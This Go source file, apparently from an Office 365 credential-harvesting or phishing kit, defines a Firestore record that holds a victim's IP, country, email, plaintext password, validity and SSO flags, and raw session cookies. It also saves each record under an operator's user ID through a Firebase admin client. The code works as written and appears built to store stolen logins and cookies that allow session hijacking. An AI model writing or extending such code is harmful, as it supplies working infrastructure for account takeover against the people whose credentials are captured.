package firestore

import (
	"context"

	"o365/utils"

	"cloud.google.com/go/firestore"
	firebase "firebase.google.com/go/v4"
	"google.golang.org/api/option"
)

var fsClient *firestore.Client

type FirestoreResult struct {
	IP               string `firestore:"ip"`
	Country          string `firestore:"country"`
	Email            string `firestore:"email"`
	Password         string `firestore:"password"`
	Valid            bool   `firestore:"valid"`
	SSO              bool   `firestore:"sso"`
	CookiesAvailable bool   `firestore:"cookiesAvailable"`
	CookiesRaw       string `firestore:"cookiesRaw,omitempty"`
	Slug             string `firestore:"slug"`
	Ts               int64  `firestore:"ts"`
}

func InitFirestore() error {
	ctx := context.Background()
	opt := option.WithCredentialsFile("firebaseAdmin.json")

	app, err := firebase.NewApp(ctx, nil, opt)
	if err != nil {
		return err
	}
	client, err := app.Firestore(ctx)
	if err != nil {
		return err
	}
	fsClient = client
	utils.SystemLogger.Info().Msg("🔥 Firestore initialized")
	return nil
}

func SaveResultToFirestore(userID string, result FirestoreResult) error {
	if fsClient == nil {
		return nil
	}
	ctx := context.Background()
	_, _, err := fsClient.Collection("results").Doc(userID).Collection("entries").Add(ctx, result)
	return err
}
